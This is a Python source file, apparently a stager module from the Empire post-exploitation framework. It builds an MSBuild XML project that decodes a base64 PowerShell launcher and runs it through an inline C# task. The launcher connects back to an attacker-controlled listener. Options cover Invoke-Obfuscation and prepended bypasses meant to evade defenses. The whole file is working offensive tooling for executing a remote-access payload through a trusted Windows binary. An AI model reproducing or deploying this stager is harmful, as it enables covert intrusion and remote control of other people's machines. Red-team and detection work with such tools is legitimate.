import logging

log = logging.getLogger(__name__)


class Stager:
    def __init__(self, mainMenu):
        self.info = {
            "Name": "msbuild_xml",
            "Authors": [
                {
                    "Name": "",
                    "Handle": "@p3nt4",
                    "Link": "",
                }
            ],
            "Description": "Generates an XML file to be run with MSBuild.exe",
            "Comments": ["On the endpoint simply launch MSBuild.exe payload.xml"],
        }

        self.options = {
            "Listener": {
                "Description": "Listener to generate stager for.",
                "Required": True,
                "Value": "",
            },
            "Language": {
                "Description": "Language of the stager to generate.",
                "Required": True,
                "Value": "powershell",
                "SuggestedValues": ["powershell", "ironpython", "csharp"],
                "Strict": True,
            },
            "StagerRetries": {
                "Description": "Times for the stager to retry connecting.",
                "Required": False,
                "Value": "0",
            },
            "Obfuscate": {
                "Description": "Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.",
                "Required": False,
                "Value": "False",
                "SuggestedValues": ["True", "False"],
                "Strict": True,
            },
            "ObfuscateCommand": {
                "Description": "The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.",
                "Required": False,
                "Value": r"Token\All\1",
            },
            "OutFile": {
                "Description": "Filename that should be used for the generated output, otherwise returned as a string.",
                "Required": False,
                "Value": "launcher.xml",
            },
            "UserAgent": {
                "Description": "User-agent string to use for the staging request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Proxy": {
                "Description": "Proxy to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "ProxyCreds": {
                "Description": r"Proxy credentials ([domain\]username:password) to use for request (default, none, or other).",
                "Required": False,
                "Value": "default",
            },
            "Bypasses": {
                "Description": "Bypasses as a space separated list to be prepended to the launcher",
                "Required": False,
                "Value": "",
            },
        }

        self.mainMenu = mainMenu

    def generate(self):
        # extract all of our options
        language = self.options["Language"]["Value"]
        listener_name = self.options["Listener"]["Value"]
        obfuscate = self.options["Obfuscate"]["Value"]
        obfuscate_command = self.options["ObfuscateCommand"]["Value"]
        user_agent = self.options["UserAgent"]["Value"]
        proxy = self.options["Proxy"]["Value"]
        proxy_creds = self.options["ProxyCreds"]["Value"]
        stager_retries = self.options["StagerRetries"]["Value"]

        encode = True

        obfuscate_script = False
        if obfuscate.lower() == "true":
            obfuscate_script = True

        if language in ["csharp", "ironpython"]:
            if (
                self.mainMenu.listenersv2.get_active_listener_by_name(
                    listener_name
                ).info["Name"]
                != "HTTP[S]"
            ):
                log.error(
                    "Only HTTP[S] listeners are supported for C# and IronPython stagers."
                )
                return ""

            launcher = self.mainMenu.stagergenv2.generate_exe_oneliner(
                language=language,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                encode=encode,
                listener_name=listener_name,
            )

        elif language == "powershell":
            launcher = self.mainMenu.stagergenv2.generate_launcher(
                listener_name=listener_name,
                language=language,
                encode=encode,
                obfuscate=obfuscate_script,
                obfuscation_command=obfuscate_command,
                user_agent=user_agent,
                proxy=proxy,
                proxy_creds=proxy_creds,
                stager_retries=stager_retries,
                bypasses=self.options["Bypasses"]["Value"],
            )

        launcher_array = launcher.split()
        if len(launcher_array) > 1:
            launcher = launcher_array[-1]

        if launcher == "":
            log.error("[!] Error in launcher command generation.")
            return ""
        code = '<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">'
        code += '<Target Name="EmpireStager">'
        code += "<ClassExample />"
        code += "</Target>"
        code += "<UsingTask "
        code += 'TaskName="ClassExample" '
        code += 'TaskFactory="CodeTaskFactory" '
        code += 'AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >'
        code += "<Task>"
        code += '<Reference Include="System.Management.Automation" />'
        code += '<Using Namespace="System" />'
        code += '<Using Namespace="System.IO" />'
        code += '<Using Namespace="System.Reflection" />'
        code += '<Using Namespace="System.Collections.Generic" />'
        code += '<Code Type="Class" Language="cs">'
        code += "<![CDATA[ "
        code += "using System;"
        code += "using System.IO;"
        code += "using System.Diagnostics;"
        code += "using System.Reflection;"
        code += "using System.Runtime.InteropServices;"
        code += "using System.Collections.ObjectModel;"
        code += "using System.Management.Automation;"
        code += "using System.Management.Automation.Runspaces;"
        code += "using System.Text;"
        code += "using Microsoft.Build.Framework;"
        code += "using Microsoft.Build.Utilities;"
        code += "public class ClassExample :  Task, ITask"
        code += "{"
        code += "public override bool Execute()"
        code += "{"
        code += (
            'byte[] data = Convert.FromBase64String("'
            + launcher
            + '");string script = Encoding.Unicode.GetString(data);'
        )
        code += "PSExecute(script);"
        code += "return true;"
        code += "}"
        code += "public static void PSExecute(string cmd)"
        code += "{"
        code += "Runspace runspace = RunspaceFactory.CreateRunspace();"
        code += "runspace.Open();"
        code += "Pipeline pipeline = runspace.CreatePipeline();"
        code += "pipeline.Commands.AddScript(cmd);"
        code += "pipeline.InvokeAsync();"
        code += "}"
        code += "}"
        code += " ]]>"
        code += "</Code>"
        code += "</Task>"
        code += "</UsingTask>"
        code += "</Project>"
        return code
